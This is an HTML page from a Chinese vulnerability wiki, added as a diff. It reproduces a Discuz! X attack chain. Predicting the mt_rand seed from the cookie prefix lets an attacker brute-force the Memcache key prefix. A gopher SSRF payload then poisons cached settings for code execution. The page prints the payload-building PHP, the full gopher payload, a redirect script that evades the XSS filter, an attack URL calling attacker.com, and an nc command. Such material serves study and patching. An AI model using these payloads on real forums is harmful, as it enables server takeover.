@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X%20authkey%2BMemcache%2Bssrf%20getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X authkey+Memcache+ssrf getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X authkey+Memcache+ssrf getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X 系列全版本 后台Sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20authkey%20%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E9%82%AE%E7%AE%B1/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20authkey%20%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E9%82%AE%E7%AE%B1/" class="btn btn-xs btn-link">
+        Discuz! X authkey 重置任意账户邮箱
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x-authkeymemcachessrf-getshell">Discuz! X authkey+Memcache+ssrf getshell<a class="headerlink" href="#discuz-x-authkeymemcachessrf-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>需要得到authkey</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Dz 整合 Memcache
+配置成功后，默认情况下网站首页右下角会出现<code>MemCache On</code>的标志：</p>
+<p><img alt="" src="../resource/Discuz%21Xauthkey%2BMemcache%2Bssrfgetshell/media/rId24.jpg" /></p>
+<p>Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF
+要攻击 Memcache ，第一个问题是，如何找到正确的键名？</p>
+<p><code>install/index.php</code> 345-357行：</p>
+<div class="codehilite"><pre><span></span><code>        $uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];
+        $authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
+        $_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;
+        $_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;
+        $_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;
+        $_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;
+        $_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;
+        $_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;
+        $_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;
+        $_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
+        $_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;
+
+        save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);
+</code></pre></div>
+
+<p>这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie
+前缀以及缓存键名前缀，其中用到了<code>random</code>函数生成随机字符串。所以跟进这个<code>random</code>：</p>
+<div class="codehilite"><pre><span></span><code>function random($length) {
+    $hash = &#39;&#39;;
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
+    $max = strlen($chars) - 1;
+    PHP_VERSION &lt; &#39;4.2.0&#39; &amp;&amp; mt_srand((double)microtime() * 1000000);
+    for($i = 0; $i &lt; $length; $i++) {
+        $hash .= $chars[mt_rand(0, $max)];
+    }
+    return $hash;
+}
+</code></pre></div>
+
+<p>可以发现，如果 PHP 版本大于 4.2.0，那么 <code>mt_rand</code>
+随机数的种子是不变的。也就是说，生成 authkey、Cookie
+前缀以及缓存键名前缀时调用的 <code>mt_rand</code> 用的都是同一个种子，而 Cookie
+前缀是已知的，通过观察 HTTP
+请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用
+<a href="https://link.zhihu.com/?target=http%3A//www.openwall.com/php_mt_seed/README">php_mt_seed</a>
+进行种子爆破。</p>
+<p>通过 <code>mt_rand</code> 种子的猜解，缓存键名前缀的可能性从 62^6 缩小到不到 1000
+个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造
+SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。</p>
+<p>Memcache
+缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来
+getshell？</p>
+<p>这一部分的思路就可以直接参照 chengable 写的那篇文章了，<code>output_replace</code>
+函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。</p>
+<p>最后准备用 gopher 协议构造 SSRF 的
+payload。写这样一段代码（先假设缓存键名前缀是 <code>IwRW7l</code>）:</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$_G</span><span class="p">[</span><span class="s1">&#39;setting&#39;</span><span class="p">][</span><span class="s1">&#39;output&#39;</span><span class="p">][</span><span class="s1">&#39;preg&#39;</span><span class="p">][</span><span class="s1">&#39;search&#39;</span><span class="p">][</span><span class="s1">&#39;plugins&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;/.*/&#39;</span><span class="p">;</span>
+<span class="nv">$_G</span><span class="p">[</span><span class="s1">&#39;setting&#39;</span><span class="p">][</span><span class="s1">&#39;output&#39;</span><span class="p">][</span><span class="s1">&#39;preg&#39;</span><span class="p">][</span><span class="s1">&#39;replace&#39;</span><span class="p">][</span><span class="s1">&#39;plugins&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;phpinfo()&#39;</span><span class="p">;</span>
+<span class="nv">$_G</span><span class="p">[</span><span class="s1">&#39;setting&#39;</span><span class="p">][</span><span class="s1">&#39;rewritestatus&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="nv">$memcache</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">;</span>
+<span class="nv">$memcache</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">11211</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span> <span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">);</span>
+<span class="nv">$memcache</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;IwRW7l_setting&#39;</span><span class="p">,</span> <span class="nv">$_G</span><span class="p">[</span><span class="s1">&#39;setting&#39;</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">gopher:</span><span class="c1">//localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D</span>
+</code></pre></div>
+
+<p>但是直接用它去 SSRF
+是不可以的，会被<code>_xss_check</code>检测到特殊字符而被拒绝请求：</p>
+<p>image</p>
+<p>所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$url</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
+<span class="nb">header</span><span class="p">(</span> <span class="s2">&quot;Location: &quot;</span> <span class="o">.</span> <span class="nv">$url</span> <span class="p">);</span>
+</code></pre></div>
+
+<p>这样就可以将 SSRF URL 进行 base64 编码从而规避<code>_xss_check</code>的检测。</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">http:</span><span class="c1">//target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;wxopenid=xxxyyy</span>
+</code></pre></div>
+
+<p>再访问<code>/forum.php?mod=ajax&amp;action=getthreadtypes&amp;inajax=yes</code>，即可看到<code>phpinfo()</code>代码已被执行：</p>
+<p><img alt="" src="../resource/Discuz%21Xauthkey%2BMemcache%2Bssrfgetshell/media/rId26.png" /></p>
+<p>由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次
+getshell 后执行以下命令，网站就可以恢复正常：</p>
+<div class="codehilite"><pre><span></span><code>echo -e &#39;flush_all&#39; | nc localhost 11211
+</code></pre></div>
+
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/51907363">https://zhuanlan.zhihu.com/p/51907363</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X 系列全版本 后台Sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20authkey%20%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E9%82%AE%E7%AE%B1/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20authkey%20%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E9%82%AE%E7%AE%B1/" class="btn btn-xs btn-link">
+        Discuz! X authkey 重置任意账户邮箱
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
